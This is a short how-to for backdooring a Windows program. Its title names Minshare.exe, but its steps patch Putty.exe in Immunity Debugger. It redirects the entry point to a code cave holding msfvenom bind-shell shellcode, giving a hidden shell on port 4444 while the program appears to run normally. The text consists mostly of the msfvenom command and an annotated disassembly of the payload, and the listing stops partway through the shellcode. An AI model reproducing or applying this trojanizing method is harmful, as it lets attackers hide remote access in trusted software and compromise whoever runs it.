Steps to backdoor Minshare.exe (version 0.67):

1. Download Putty.exe from this link https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
2. Open it in Immunity Debugger
3. Replace the program entry point with the 'Program Entry Point' instruction below
4. Jump to address 0x0047C6AF
5. Binary paste the code below (you'll need to filter out only the opcodes)
6. Select modifications and Copy to executable
7. Save the new executable
8. Run the application
9. Connect to the shell at port 4444 (you can use msfconsole and setup a multi/handler listener)
10. You'll get a shell to the target machine and the application runs as usual (as long as a listener is setup and ready to connect to port 4444)

Shellcode command: msfvenom -p windows/shell_bind_tcp LPORT=4444 -f hex EXITFUNC=none


004550F0 > $-E9 BA750200    JMP putty_12.0047C6AF                 -> Program entry point

004550F5   . E8 0A210000    CALL putty_11.00457204                -> Address to return to

0047C6AF   60               PUSHAD                            -> Saving registers to stack
0047C6B0   9C               PUSHFD                            -> Saving flags to stack
0047C6B1   90               NOP
0047C6B2   90               NOP
0047C6B3   90               NOP
0047C6B4   90               NOP
0047C6B5   90               NOP
0047C6B6   90               NOP
0047C6B7   90               NOP
0047C6B8   90               NOP
0047C6B9   FC               CLD                               -> TCP bind shellcode. Binds a shell at port 4444
0047C6BA   E8 82000000      CALL putty_12.0047C741
0047C6BF   60               PUSHAD
0047C6C0   89E5             MOV EBP,ESP
0047C6C2   31C0             XOR EAX,EAX
0047C6C4   64:8B50 30       MOV EDX,DWORD PTR FS:[EAX+30]
0047C6C8   8B52 0C          MOV EDX,DWORD PTR DS:[EDX+C]
0047C6CB   8B52 14          MOV EDX,DWORD PTR DS:[EDX+14]
0047C6CE   8B72 28          MOV ESI,DWORD PTR DS:[EDX+28]
0047C6D1   0FB74A 26        MOVZX ECX,WORD PTR DS:[EDX+26]
0047C6D5   31FF             XOR EDI,EDI
0047C6D7   AC               LODS BYTE PTR DS:[ESI]
0047C6D8   3C 61            CMP AL,61
0047C6DA   7C 02            JL SHORT putty_12.0047C6DE
0047C6DC   2C 20            SUB AL,20
0047C6DE   C1CF 0D          ROR EDI,0D
0047C6E1   01C7             ADD EDI,EAX
0047C6E3  ^E2 F2            LOOPD SHORT putty_12.0047C6D7
0047C6E5   52               PUSH EDX
0047C6E6   57               PUSH EDI
0047C6E7   8B52 10          MOV EDX,DWORD PTR DS:[EDX+10]
0047C6EA   8B4A 3C          MOV ECX,DWORD PTR DS:[EDX+3C]
0047C6ED   8B4C11 78        MOV ECX,DWORD PTR DS:[ECX+EDX+78]
0047C6F1   E3 48            JECXZ SHORT putty_12.0047C73B
0047C6F3   01D1             ADD ECX,EDX
0047C6F5   51               PUSH ECX
0047C6F6   8B59 20          MOV EBX,DWORD PTR DS:[ECX+20]
0047C6F9   01D3             ADD EBX,EDX
0047C6FB   8B49 18          MOV ECX,DWORD PTR DS:[ECX+18]
0047C6FE   E3 3A            JECXZ SHORT putty_12.0047C73A
0047C700   49               DEC ECX
0047C701   8B348B           MOV ESI,DWORD PTR DS:[EBX+ECX*4]
0047C704   01D6             ADD ESI,EDX
0047C706   31FF             XOR EDI,EDI
0047C708   AC               LODS BYTE PTR DS:[ESI]
0047C709   C1CF 0D          ROR EDI,0D
0047C70C   01C7             ADD EDI,EAX
0047C70E   38E0             CMP AL,AH
0047C710  ^75 F6            JNZ SHORT putty_12.0047C708
0047C712   037D F8          ADD EDI,DWORD PTR SS:[EBP-8]
0047C715   3B7D 24          CMP EDI,DWORD PTR SS:[EBP+24]
0047C718  ^75 E4            JNZ SHORT putty_12.0047C6FE
0047C71A   58               POP EAX
0047C71B   8B58 24          MOV EBX,DWORD PTR DS:[EAX+24]
0047C71E   01D3             ADD EBX,EDX
0047C720   66:8B0C4B        MOV CX,WORD PTR DS:[EBX+ECX*2]
0047C724   8B58 1C          MOV EBX,DWORD PTR DS:[EAX+1C]
0047C727   01D3             ADD EBX,EDX
0047C729   8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
0047C72C   01D0             ADD EAX,EDX
0047C72E   894424 24        MOV DWORD PTR SS:[ESP+24],EAX
0047C732   5B               POP EBX
0047C733   5B               POP EBX
0047C734   61               POPAD
0047C735   59               POP ECX
0047C736   5A               POP EDX
0047C737   51               PUSH ECX
0047C738   FFE0             JMP EAX
0047C73A   5F               POP EDI
0047C73B   5F               POP EDI
0047C73C   5A               POP EDX
0047C73D   8B12             MOV EDX,DWORD PTR DS:[EDX]
0047C73F  ^EB 8D            JMP SHORT putty_12.0047C6CE
0047C741   5D               POP EBP
0047C742   68 33320000      PUSH 3233
0047C747   68 7773325F      PUSH 5F327377
0047C74C   54               PUSH ESP
0047C74D   68 4C772607      PUSH 726774C
0047C752   FFD5             CALL EBP
0047C754   B8 90010000      MOV EAX,190
0047C759   29C4             SUB ESP,EAX
0047C75B   54               PUSH ESP
0047C75C   50               PUSH EAX
0047C75D   68 29806B00      PUSH 6B8029
0047C762   FFD5             CALL EBP
0047C764   6A 08            PUSH 8
0047C766   59               POP ECX
